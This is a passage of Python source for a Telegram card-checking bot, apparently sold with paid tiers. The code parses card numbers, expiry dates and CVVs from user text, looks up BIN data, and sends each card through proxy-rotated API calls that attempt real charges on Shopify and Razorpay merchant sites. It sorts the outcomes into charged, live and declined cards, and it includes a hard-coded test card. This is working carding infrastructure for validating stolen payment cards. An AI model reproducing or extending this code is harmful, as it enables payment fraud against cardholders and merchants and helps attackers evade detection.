    _JOIN_CACHE[user_id] = now
    return True

async def force_join_check(event):
    if event.sender_id in ADMIN_ID:
        return True
    if await is_user_joined(event.sender_id):
        return True
    _JOIN_CACHE.pop(event.sender_id, None)
    await remove_joined_mark(event.sender_id)
    buttons = [
        [pbtn(bs("Join Channel"), url=JOIN_CHANNEL_LINK, bg_primary=True, icon=CE["link"])],
        [pbtn(bs("Join Group"), url=JOIN_GROUP_LINK, bg_success=True, icon=CE["party"])],
        [pbtn(bs("I have joined"), data="check_joined", bg_success=True, icon=CE["check"])]
    ]
    text = f"""{PE} <b>{bs('Access Locked')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Join Both Chats to Unlock')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Channel')}:</b> <i>{bs('PrimeTheOfficialNew Chk CHANNEL')}</i>
{PE} <b>{bs('Group')}:</b> <i>{bs('PrimeTheOfficialNew Chk Chat')}</i>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('All Features Restricted')}</b>"""
    try:
        await styled_reply(event, text, buttons=buttons, emoji_ids=[CE["fire"], CE["fire"], CE["stop"], CE["link"], CE["info"], CE["warn"]], file=random.choice(FORCE_JOIN_IMAGES))
    except:
        await styled_reply(event, text, buttons=buttons, emoji_ids=[CE["fire"], CE["fire"], CE["stop"], CE["link"], CE["info"], CE["warn"]])
    return False

# ====================== MAINTENANCE ======================
async def set_maintenance_mode(enabled):
    global _MAINTENANCE_CACHE
    try:
        async with aiofiles.open(MAINTENANCE_FILE, "w") as f:
            await f.write(json.dumps({"maintenance": enabled}))
        _MAINTENANCE_CACHE = {"enabled": enabled, "last_check": time.time()}
    except:
        pass

async def get_maintenance_mode():
    global _MAINTENANCE_CACHE
    now = time.time()
    if _MAINTENANCE_CACHE["enabled"] is not None and now - _MAINTENANCE_CACHE["last_check"] < 30:
        return _MAINTENANCE_CACHE["enabled"]
    try:
        if not os.path.exists(MAINTENANCE_FILE):
            return False
        async with aiofiles.open(MAINTENANCE_FILE, "r") as f:
            data = json.loads(await f.read())
            _MAINTENANCE_CACHE = {"enabled": data.get("maintenance", False), "last_check": now}
            return _MAINTENANCE_CACHE["enabled"]
    except:
        return False

async def check_maintenance(event):
    if await get_maintenance_mode() and event.sender_id not in ADMIN_ID:
        await styled_reply(event, f"""{PE} <b>{bs('Maintenance')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Bot under maintenance')}</b>
{PE} <i>{bs('Try again later')}</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["info"]])
        return True
    return False

# ====================== GATEWAY STATUS ======================
async def is_gateway_disabled(gateway: str) -> bool:
    doc = await db["settings"].find_one({"key": f"disabled_{gateway.lower()}"})
    return doc is not None

async def set_gateway_status(gateway: str, disabled: bool):
    if disabled:
        await db["settings"].update_one(
            {"key": f"disabled_{gateway.lower()}"},
            {"$set": {"disabled": True, "updated_at": datetime.utcnow()}},
            upsert=True
        )
    else:
        await db["settings"].delete_one({"key": f"disabled_{gateway.lower()}"})

# ====================== ACCESS ======================
async def can_use(user_id, chat):
    await ensure_user(user_id)
    if await is_banned_user(user_id):
        return False, "banned"
    plan = (await get_user_plan(user_id)).title()
    return True, f"{plan}_private" if chat.id == user_id else f"{plan}_group"

async def get_user_access(event):
    await ensure_user(event.sender_id)
    if await is_banned_user(event.sender_id):
        return False, "banned", "Bronze"
    plan = (await get_user_plan(event.sender_id)).title()
    return True, f"{plan}_private" if event.chat.id == event.sender_id else f"{plan}_group", plan

async def get_cc_limit(plan, uid=None):
    if uid and uid in ADMIN_ID:
        return 999999
    return await get_user_limit(uid, plan)

def is_paid_plan(plan):
    return plan.title() in PAID_TIERS if plan else False

async def send_group_only_message(event):
    return await styled_reply(event, f"""{PE} <b>{bs('Group Only')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Free users')} → {bs('group only')}</b>
{PE} <i>{bs('Upgrade for private access')}</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["gem"]])

async def send_premium_only_message(event):
    return await styled_reply(event, f"""{PE} <b>{bs('Premium Only')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('This feature requires an active plan')}</b>
{PE} <i>{bs('Use /plan to see available plans')}</i>""", buttons=[[pbtn(bs("Upgrade"), url="https://t.me/PrimeTheOfficialNew")]], emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["info"]])

def banned_user_message():
    return f"""{PE} <b>{bs('Banned')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Not allowed')}</b>
{PE} <b>{bs('Appeal')}:</b> <i>{bs('Contact Admin')}</i>""", [CE["stop"], CE["stop"], CE["warn"], CE["info"]]

# ====================== UTILITIES ======================
def extract_cc(text):
    if not text:
        return []
    cards = []
    lines = text.splitlines()
    
    pattern1 = re.compile(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})')
    pattern2 = re.compile(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})')
    pattern3 = re.compile(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})')
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        m = pattern1.search(line)
        if m:
            c, mm, y, cv = m.groups()
            if len(y) == 2: y = '20' + y
            cards.append(f"{c}|{mm}|{y}|{cv}")
            continue
        m = pattern2.search(line)
        if m:
            c, mm, y, cv = m.groups()
            cards.append(f"{c}|{mm}|{y}|{cv}")
            continue
        m = pattern3.search(line)
        if m:
            c, mm, y, cv = m.groups()
            cards.append(f"{c}|{mm}|20{y}|{cv}")
            continue
            
    return list(dict.fromkeys(cards))

def is_valid_url_or_domain(url):
    d = url.lower()
    if d.startswith(('http://', 'https://')):
        try: d = urlparse(url).netloc
        except: return False
    return bool(re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$', d))

def extract_urls_from_text(text):
    seen, result = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line: continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            norm = normalize_site_url(m.group(1).rstrip('/'))
            if norm and is_valid_url_or_domain(norm) and norm not in seen:
                seen.add(norm); result.append(norm)
            continue
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
        if cleaned:
            norm = normalize_site_url(cleaned)
            if norm and is_valid_url_or_domain(norm) and norm not in seen:
                seen.add(norm); result.append(norm)
    return result

def parse_proxy_format(proxy):
    try:
        proxy = proxy.strip()
        if not proxy:
            return None
            
        proxy = re.sub(r'^(?:/\w+\s+)', '', proxy).strip()
        
        pt = 'http'
        if "://" in proxy:
            pt, proxy = proxy.split("://", 1)
            pt = pt.lower()
            
        username = None
        password = None
        host = None
        port = None
        
        if '@' in proxy:
            parts = proxy.split('@', 1)
            p0, p1 = parts[0].strip(), parts[1].strip()
            
            def is_host_port(s: str) -> bool:
                subparts = s.split(':')
                if len(subparts) >= 2:
                    return subparts[-1].isdigit()
                return False
            
            if is_host_port(p1):
                creds, address = p0, p1
            elif is_host_port(p0):
                address, creds = p0, p1
            else:
                creds, address = p0, p1
            
            if ':' in creds:
                username, password = creds.split(':', 1)
            else:
                username = creds
                
            if ':' in address:
                host, port = address.split(':', 1)
            else:
                host = address
        else:
            parts = [p.strip() for p in proxy.split(':') if p.strip()]
            if len(parts) == 2:
                host, port = parts[0], parts[1]
            elif len(parts) == 4:
                is_p1_port = parts[1].isdigit()
                is_p3_port = parts[3].isdigit()
                has_dot_p0 = '.' in parts[0]
                has_dot_p2 = '.' in parts[2]
                
                if is_p1_port and not is_p3_port:
                    host, port, username, password = parts[0], parts[1], parts[2], parts[3]
                elif is_p3_port and not is_p1_port:
                    username, password, host, port = parts[0], parts[1], parts[2], parts[3]
                elif has_dot_p0 and not has_dot_p2:
                    host, port, username, password = parts[0], parts[1], parts[2], parts[3]
                elif has_dot_p2 and not has_dot_p0:
                    username, password, host, port = parts[0], parts[1], parts[2], parts[3]
                else:
                    host, port, username, password = parts[0], parts[1], parts[2], parts[3]
            elif len(parts) == 3:
                if parts[2].isdigit():
                    username, host, port = parts[0], parts[1], parts[2]
                elif parts[1].isdigit():
                    host, port, username = parts[0], parts[1], parts[2]
            else:
                return None
                
        if not host or not port:
            return None
            
        host = host.strip()
        port = port.strip()
        if username: username = username.strip()
        if password: password = password.strip()
        
        pu = f'{pt}://{username}:{password}@{host}:{port}' if username and password else (f'{pt}://{username}@{host}:{port}' if username else f'{pt}://{host}:{port}')
        return {'ip': host, 'port': port, 'username': username or None, 'password': password or None, 'proxy_url': pu, 'type': pt}
    except Exception:
        return None

async def test_proxy(proxy_url):
    try:
        s = await get_proxy_session()
        async with s.get('http://api.ipify.org?format=json', proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT)) as r:
            if r.status == 200: return True, (await r.json()).get('ip', '?')
            return False, None
    except Exception as e:
        return False, str(e)

async def get_bin_info(cn):
    try:
        s = await get_bin_session()
        async with _BIN_SEM:
            async with s.get(f'https://bins.antipublic.cc/bins/{cn[:6]}') as r:
                if r.status != 200:
                    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
                d = await r.json(content_type=None)
                return {"brand": d.get('brand', '-'), "type": d.get('type', '-'), "level": d.get('level', '-'), "bank": d.get('bank', '-'), "country": d.get('country_name', '-'), "flag": d.get('country_flag', '🏳️')}
    except:
        return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}

_BIN_CACHE = {}

async def get_bin_info_cached(cn):
    bin6 = cn[:6]
    if bin6 in _BIN_CACHE:
        return _BIN_CACHE[bin6]
    bi = await get_bin_info(cn)
    _BIN_CACHE[bin6] = bi
    return bi

# ====================== SHOPIFY API ======================
def build_api_url(site, cc, proxy_data=None):
    if not site.startswith('http'): site = f'https://{site}'
    url = f'{API_BASE_URL}?site={quote(site, safe="")}&cc={quote(cc, safe="")}'
    if proxy_data:
        ip, port = proxy_data['ip'], proxy_data['port']
        un, pw = proxy_data.get('username'), proxy_data.get('password')
        ps = f"{ip}:{port}:{un}:{pw}" if un and pw else f"{ip}:{port}"
        url += f'&proxy={quote(ps, safe="")}'
    return url

def classify_response(rj):
    ar = str(rj.get('Response', ''))
    if ar.upper() == 'DS_REQUIRED': ar = '3DS_REQUIRED'
    st = rj.get('Status', False)
    price = rj.get('Price', '-')
    gw = rj.get('Gate', rj.get('Gateway', 'Shopify'))
    if price is not None and price != '-': price = f"${price}"
    rl = ar.lower()
    if is_site_error(ar) or is_proxy_error(ar):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "SiteError"}
    ch = ['order_paid', 'order_placed', 'order_confirmed', 'thank you', 'payment successful', 'order_completed', 'charged', 'order_created', 'order confirmed']
    ap = ['otp_required', 'otp required', '3d_authentication', '3ds_required', '3d required', '3d_redirect', 'authentication_required', 'insufficient_funds', 'insufficient funds', 'cvc', 'ccn', 'ccn live cvv']
    dc = ['generic_decline', 'generic decline', 'do_not_honor', 'do not honor', 'stolen_card', 'lost_card', 'pickup_card', 'pick_up_card', 'restricted_card', 'restricted card', 'fraudulent', 'fraud suspected', 'fraud_suspected', 'expired_card', 'expired card', 'transaction_not_allowed', 'transaction not allowed', 'card_declined', 'card declined', 'processor_declined', 'processor declined', 'card_not_supported', 'card not supported', 'currency_not_supported', 'duplicate_transaction', 'revocation_of_authorization', 'no_action_taken', 'try_again_later', 'not_permitted', 'decline', 'your card was declined', 'payment_intent_authentication_failure', 'avs_check_failed', 'incorrect number', 'incorrect_number', 'invalid', 'invalid_number', 'decision_rule_block', 'generic_error']
    if any(k in rl for k in ch): return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Charged"}
    if any(k in rl for k in ap): return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Approved"}
    if any(k in rl for k in dc): return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Declined"}
    if st is True and not any(w in rl for w in ["decline", "denied", "failed", "error", "rejected", "refused", "fraud"]):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Approved"}
    return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Declined"}

async def check_card_api(card, site, proxy_data=None, user_id=None, http_session=None):
    uid = user_id or "?"
    try:
        url = build_api_url(site if site.startswith('http') else f'https://{site}', card, proxy_data)
        s = http_session or (await get_user_http_session(uid, "sp"))
        async with s.get(url) as r:
            if r.status != 200:
                return {"Response": f"HTTP_{r.status}", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
            try: rj = await r.json(content_type=None)
            except: return {"Response": "Invalid JSON", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
        result = classify_response(rj)
        result["card"] = card
        result["site"] = site
        return result
    except asyncio.TimeoutError:
        return {"Response": "Timeout", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
    except asyncio.CancelledError:
        raise
    except Exception as e:
        err = str(e)
        st2 = "SiteError" if is_site_error(err) or is_proxy_error(err) else "Declined"
        return {"Response": err[:100], "Price": "-", "Gateway": "Unknown", "Status": st2, "card": card, "site": site}

async def check_card_with_retry(card, sites, user_id=None, proxies_data=None, max_retries=3, rotator=None, cancel_check=None, http_session=None):
    if not sites:
        return {"Response": "No sites", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1
    tried_sites = set()
    tried_proxies = set()
    last = None
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Response": "Stopped", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1
        if rotator: site = rotator.pick_site(sites, exclude=tried_sites)
        else:
            available = [s for s in sites if s not in tried_sites] or list(sites)
            site = random.choice(available)
        tried_sites.add(site)
        proxy_data = None
        if proxies_data:
            if rotator: proxy_data = rotator.pick_proxy(proxies_data, exclude=tried_proxies)
            else:
                available_px = [p for p in proxies_data if p.get('proxy_url') not in tried_proxies] or list(proxies_data)
                proxy_data = random.choice(available_px)
            if proxy_data: tried_proxies.add(proxy_data.get('proxy_url'))
        result = await check_card_api(card, site, proxy_data, user_id, http_session=http_session)
        if result.get("Status") != "SiteError":
            if rotator:
                rotator.report_site_ok(site)
                if proxy_data: rotator.report_proxy_ok(proxy_data.get('proxy_url'))
            return result, sites.index(site) + 1
        if rotator:
            rotator.report_site_fail(site)
            if proxy_data and is_proxy_error(result.get("Response", "")):
                rotator.report_proxy_fail(proxy_data.get('proxy_url'))
        last = result
        if attempt < max_retries - 1: await asyncio.sleep(0.3)
    if last:
        last["Status"] = "Error"
        return last, -1
    return {"Response": "Max retries", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1

async def test_site(site, proxy_data=None, http_session=None):
    test_card = "5154623245618097|03|2032|156"
    try:
        url = build_api_url(site if site.startswith('http') else f'https://{site}', test_card, proxy_data)
        s = http_session or (await get_user_http_session(0, "site"))
        async with s.get(url) as resp:
            if resp.status != 200: return {'site': site, 'status': 'dead', 'price': '-', 'response': f'HTTP_{resp.status}'}
            try: raw = await resp.json(content_type=None)
            except: return {'site': site, 'status': 'dead', 'price': '-', 'response': 'Invalid JSON'}
        rm = raw.get('Response', '')
        price = raw.get('Price', '-')
        if price and price != '-': price = f"${price}"
        if is_site_error(rm.lower()): return {'site': site, 'status': 'dead', 'price': price, 'response': rm}
        if not is_truly_alive(rm, price): return {'site': site, 'status': 'dead', 'price': price, 'response': rm}
        return {'site': site, 'status': 'alive', 'price': price, 'response': rm}
    except Exception as e:
        return {'site': site, 'status': 'dead', 'price': '-', 'response': str(e)[:50]}

# ====================== RAZORPAY API ======================
async def check_rz_api(card, site, proxy_data=None, user_id=None, http_session=None):
    uid = user_id or "?"
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {"Status": "Declined", "Response": "Invalid format", "Gateway": "RazorPay", "Price": "-", "card": card, "site": site}
        
        if not site.startswith('http'):
            site = f'https://{site}'
        
        proxy_param = ""
        if proxy_data:
            if isinstance(proxy_data, dict):
                ip = proxy_data.get('ip')
                port = proxy_data.get('port')
                user = proxy_data.get('username')
                pw = proxy_data.get('password')
                if ip and port:
                    proxy_param = f"{ip}:{port}:{user}:{pw}" if user and pw else f"{ip}:{port}"
            else:
                proxy_str = str(proxy_data)
                if "://" in proxy_str:
                    _, proxy_str = proxy_str.split("://", 1)
                if "@" in proxy_str:
                    creds, addr = proxy_str.split("@", 1)
                    ip = addr.split(":")[0] if ":" in addr else addr
                    port = addr.split(":")[1] if ":" in addr else ""
                    user = creds.split(":")[0] if ":" in creds else creds
                    pw = creds.split(":")[1] if ":" in creds else ""
                    proxy_param = f"{ip}:{port}:{user}:{pw}" if user and pw else f"{ip}:{port}"
                else:
                    proxy_param = proxy_str
            
        amt = await get_razorpay_amount()
        api_url = get_next_razorpay_api_url()
        url = f'{api_url}?url={quote(site, safe="")}&cc={quote(card, safe="")}&amount={amt}'
        if proxy_param:
            url += f'&proxy={quote(proxy_param, safe="")}'
            
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
        }
        
        s = http_session or (await get_user_http_session(uid, "rz"))
        async with s.get(url, headers=headers) as resp:
            if resp.status != 200:
                return {"Status": "RetryError", "Response": f"HTTP_{resp.status}", "Gateway": "RazorPay", "Price": "-", "card": card, "site": site}
            try:
                result_text = await resp.text()
                data = json.loads(result_text)
            except:
                text = result_text if 'result_text' in locals() else await resp.text()
                text_lower = text.lower()
                if 'not supported by merchant' in text_lower or 'this type of card is not supported' in text_lower:
                    if "(site:" not in text_lower:
                        text = f"{text} (Site: {site})"
                        text_lower = text.lower()
                if any(w in text_lower for w in [
                    'failed to get', 'failed to extract', 'failed to tokenize', 'failed to load',
                    'session token', 'no session token', 'payment page data', 'payment page',
                    'unsupported protocol', 'connection failed', 'proxy error', 'proxy dead', 'request timeout',
                    'unable to get payment token', 'unable to create order',
                    'failed to get session token', 'failed to extract payment page',
                    'this type of card is not supported by merchant', 'not supported by merchant'
                ]):
                    return {"Status": "RetryError", "Response": text[:100], "Gateway": "RazorPay", "Price": "-", "card": card, "site": site}
                if 'success' in text.lower() or 'charged' in text.lower():
                    return {"Status": "Charged", "Response": text[:100], "Gateway": "RazorPay", "Price": f"₹{amt / 100:.2f}", "card": card, "site": site}
                elif 'declined' in text.lower() or 'failed' in text.lower():
                    return {"Status": "Declined", "Response": text[:100], "Gateway": "RazorPay", "Price": f"₹{amt / 100:.2f}", "card": card, "site": site}
                return {"Status": "RetryError", "Response": "Invalid JSON response", "Gateway": "RazorPay", "Price": "-", "card": card, "site": site}
        
        status_val = str(data.get('Status', data.get('status', ''))).upper()
        resp_val = str(data.get('Response', data.get('response', data.get('message', ''))))
        
        resp_lower = resp_val.lower()
        if 'not supported by merchant' in resp_lower or 'this type of card is not supported' in resp_lower:
            if "(site:" not in resp_lower:
                resp_val = f"{resp_val} (Site: {site})"
                resp_lower = resp_val.lower()
        
        if any(w in resp_lower for w in [
            'failed to get', 'failed to extract', 'failed to tokenize', 'failed to load',
            'session token', 'no session token', 'payment page data', 'payment page',
            'unsupported protocol', 'connection failed', 'proxy error', 'proxy dead', 'request timeout',
            'unable to get payment token', 'unable to create order',
            'failed to get session token', 'failed to extract payment page',
            'not supported by merchant', 'this type of card is not supported'
        ]):
            return {"Status": "RetryError", "Response": resp_val, "Gateway": "RazorPay", "Price": "-", "card": card, "site": site}
            
        if status_val == 'LIVE' or status_val == 'APPROVED':
            return {"Status": "Approved", "Response": resp_val, "Gateway": "RazorPay", "Price": f"₹{amt / 100:.2f}", "card": card, "site": site}
        elif status_val == 'CHARGED' or status_val == 'SUCCESS':
            return {"Status": "Charged", "Response": resp_val, "Gateway": "RazorPay", "Price": f"₹{amt / 100:.2f}", "card": card, "site": site}
        elif status_val == 'DEAD' or status_val == 'FAILED' or status_val == 'DECLINED':
            if any(w in resp_lower for w in [
                'unable to get payment token', 'unable to create order',
                'failed to get session token', 'failed to extract payment page',
                'not supported by merchant', 'this type of card is not supported'
            ]):
                return {"Status": "RetryError", "Response": resp_val, "Gateway": "RazorPay", "Price": "-", "card": card, "site": site}
            return {"Status": "Declined", "Response": resp_val, "Gateway": "RazorPay", "Price": f"₹{amt / 100:.2f}", "card": card, "site": site}
        
        if any(w in resp_val.lower() for w in ['success', 'charged', 'approved']):
            return {"Status": "Charged", "Response": resp_val, "Gateway": "RazorPay", "Price": f"₹{amt / 100:.2f}", "card": card, "site": site}
        elif 'insufficient' in resp_val.lower() or 'insufficient_funds' in resp_val.lower():
            return {"Status": "Approved", "Response": resp_val, "Gateway": "RazorPay", "Price": f"₹{amt / 100:.2f}", "card": card, "site": site}
        elif 'declined' in resp_val.lower() or 'failed' in resp_val.lower():
            return {"Status": "Declined", "Response": resp_val, "Gateway": "RazorPay", "Price": f"₹{amt / 100:.2f}", "card": card, "site": site}
            
        if is_rz_retry_error(resp_val) or 'failed to get session token' in resp_val.lower():
            return {"Status": "RetryError", "Response": resp_val, "Gateway": "RazorPay", "Price": "-", "card": card, "site": site}
        amt = await get_razorpay_amount()
        return {"Status": "Declined", "Response": resp_val or "No response", "Gateway": "RazorPay", "Price": f"₹{amt / 100:.2f}", "card": card, "site": site}
    except asyncio.TimeoutError:
        return {"Status": "RetryError", "Response": "Timeout", "Gateway": "RazorPay", "Price": "-", "card": card, "site": site}
    except Exception as e:
        err_msg = str(e)[:100]
        amt = 1000
        try:
            doc = await db["settings"].find_one({"key": "razorpay_amount"})
            if doc: amt = doc.get("amount", 1000)
        except:
            pass
        err_msg_lower = err_msg.lower()
        if 'not supported by merchant' in err_msg_lower or 'this type of card is not supported' in err_msg_lower:
            if "(site:" not in err_msg_lower:
                err_msg = f"{err_msg} (Site: {site})"
                err_msg_lower = err_msg.lower()
        if is_rz_retry_error(err_msg) or any(w in err_msg_lower for w in [
            'failed to get', 'failed to extract', 'failed to tokenize', 'failed to load',
            'session token', 'no session token', 'payment page data', 'payment page',
            'unsupported protocol', 'connection failed', 'proxy error', 'proxy dead', 'request timeout',
            'unable to get payment token', 'unable to create order',
            'failed to get session token', 'failed to extract payment page',
            'not supported by merchant', 'this type of card is not supported'
        ]):
            return {"Status": "RetryError", "Response": err_msg, "Gateway": "RazorPay", "Price": "-", "card": card, "site": site}
        return {"Status": "Declined", "Response": err_msg, "Gateway": "RazorPay", "Price": f"₹{amt / 100:.2f}", "card": card, "site": site}

async def check_rz_with_retry(card, proxies_data=None, user_id=None, max_retries=3, cancel_check=None, http_session=None):
    active_site = await get_active_rz_site()
    if active_site:
        sites = [active_site]
    else:
        sites = load_razorpay_sites()
    if not sites:
        return {"Status": "Declined", "Response": "No Razorpay sites", "Gateway": "RazorPay", "Price": "-", "card": card, "site": "-"}
    
    tried_proxies = set()
    tried_sites = set()
    last = None
    
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Status": "Declined", "Response": "Stopped", "Gateway": "RazorPay", "Price": "-", "card": card, "site": "-"}
        
        available_sites = [s for s in sites if s not in tried_sites] or list(sites)
        site = random.choice(available_sites)
        tried_sites.add(site)
        
        proxy_data = None
        if proxies_data:
            available_px = [p for p in proxies_data if p.get('proxy_url') not in tried_proxies] or list(proxies_data)
            proxy_data = random.choice(available_px)
            if proxy_data:
                tried_proxies.add(proxy_data.get('proxy_url'))
                
        result = await check_rz_api(card, site, proxy_data, user_id, http_session=http_session)
        resp_lower = str(result.get("Response", "")).lower()
        if "international card not supported" in resp_lower or "international card" in resp_lower or "international" in resp_lower:
            asyncio.create_task(remove_razorpay_site_programmatically(site))
            admin_log = f"⚠️ <b>{bs('RAZORPAY SITE REMOVED')}</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Reason')}:</b> <code>International card not supported</code>\n{PE} <b>{bs('Site Link')}:</b> <code>{site}</code>"
            asyncio.create_task(log_to_admins(admin_log))
            
            last = {"Status": "RetryError", "Response": "International Card Not Supported", "Gateway": "RazorPay", "Price": "-", "card": card, "site": site}
            continue
            
        if result.get("Status") != "RetryError":
            return result
        last = result
        if attempt < max_retries - 1:
            await asyncio.sleep(1)
            
    if last:
        if last.get("Response") == "International Card Not Supported":
            last["Status"] = "Error"
        elif last.get("Status") == "RetryError":
            last["Status"] = "Error"
        else:
            last["Status"] = "Declined"
        return last
    return {"Status": "Error", "Response": "Max retries exceeded", "Gateway": "RazorPay", "Price": "-", "card": card, "site": "-"}

# ====================== STATUS SYSTEM ======================
def _get_system_uptime():
    if not PSUTIL_AVAILABLE: return "N/A"
    uptime_seconds = int(time.time() - psutil.boot_time())
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours:02}:{minutes:02}:{seconds:02}"

def _get_bot_uptime():
    uptime_seconds = int(time.time() - BOT_START_TIME)
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours:02}:{minutes:02}:{seconds:02}"

def _create_progress_bar(percentage, length=10):
    filled_length = int(length * percentage / 100)
    return f"{'█' * filled_length}{'░' * (length - filled_length)} {percentage:.1f}%"

def _get_system_info():
    if not PSUTIL_AVAILABLE:
        return {"error": "psutil not installed", "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    try:
        cpu_usage = psutil.cpu_percent(interval=0)
        cpu_count = psutil.cpu_count(logical=True)
        cpu_freq = psutil.cpu_freq()
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage("/")
        network = psutil.net_io_counters()
        network_interfaces = psutil.net_if_addrs()
        active_interfaces = [i for i in network_interfaces.keys() if not i.startswith(('lo', 'docker', 'br-'))]
        return {
            "cpu_usage": cpu_usage, "cpu_count": cpu_count,
            "cpu_freq": cpu_freq.current if cpu_freq else 0,
            "total_memory": memory.total / (1024**3), "used_memory": memory.used / (1024**3),
            "available_memory": memory.available / (1024**3), "memory_percent": memory.percent,
            "total_disk": disk.total / (1024**3), "used_disk": disk.used / (1024**3),
            "free_disk": disk.free / (1024**3), "disk_percent": disk.percent,
            "hostname": socket.gethostname(), "os_name": platform.system(),
            "os_version": platform.version(), "architecture": platform.machine(),
            "bytes_sent": network.bytes_sent / (1024**2), "bytes_recv": network.bytes_recv / (1024**2),
            "active_interfaces": active_interfaces, "uptime_str": _get_system_uptime(),
            "bot_uptime_str": _get_bot_uptime(),
            "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "bot_restart_time": datetime.fromtimestamp(BOT_START_TIME).strftime("%Y-%m-%d %H:%M:%S"),
            "cpu_critical": cpu_usage > 90, "memory_critical": memory.percent > 90,
            "disk_critical": disk.percent > 90, "error": None
        }
    except Exception as e:
        return {"error": str(e), "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

async def _build_status_text():
    sys_info = await asyncio.get_event_loop().run_in_executor(None, _get_system_info)
    if sys_info.get("error"):
        return f"⌬ <b>𝐄𝐫𝐫𝐨𝐫</b> ↬ <code>❌ {sys_info['error']}</code>\n⌬ <b>𝐁𝐨𝐭 𝐁𝐲</b> ↬ <a href='https://t.me/PrimeTheOfficialNew'>PrimeTheOfficialNewfer</a>"
    os_v = sys_info["os_version"].split("-")[0] if "-" in sys_info["os_version"] else sys_info["os_version"]
    s = sys_info
    msg = (
        f"⌬ <b>𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐮𝐬</b> ↬ <code>✅ Active</code>\n――――――――――――――\n"
        f"⌬ <b>𝐁𝐨𝐭 𝐔𝐩𝐭𝐢𝐦𝐞</b> ↬ <code>{s['bot_uptime_str']}</code>\n"
        f"⌬ <b>𝐒𝐲𝐬𝐭𝐞𝐦 𝐔𝐩𝐭𝐢𝐦𝐞</b> ↬ <code>{s['uptime_str']}</code>\n"
        f"⌬ <b>𝐋𝐚𝐬𝐭 𝐑𝐞𝐬𝐭𝐚𝐫𝐭</b> ↬ <code>{s['bot_restart_time']}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐂𝐏𝐔</b> ↬ <code>{s['cpu_usage']:.1f}% ({s['cpu_count']} cores)</code>\n"
        f"⊀ <b>Usage</b> ↬ <code>{_create_progress_bar(s['cpu_usage'])}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐑𝐀𝐌</b> ↬ <code>{s['used_memory']:.2f}GB / {s['total_memory']:.2f}GB</code>\n"
        f"⊀ <b>Usage</b> ↬ <code>{_create_progress_bar(s['memory_percent'])}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐃𝐢𝐬𝐤</b> ↬ <code>{s['used_disk']:.2f}GB / {s['total_disk']:.2f}GB</code>\n"
        f"⊀ <b>Usage</b> ↬ <code>{_create_progress_bar(s['disk_percent'])}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐍𝐞𝐭𝐰𝐨𝐫𝐤</b> ↬ <code>↑ {s['bytes_sent']:.1f}MB ↓ {s['bytes_recv']:.1f}MB</code>\n"
    )
    if s["cpu_critical"] or s["memory_critical"] or s["disk_critical"]:
        msg += "\n⚠️ <b>Warning:</b> System resources critically low!"
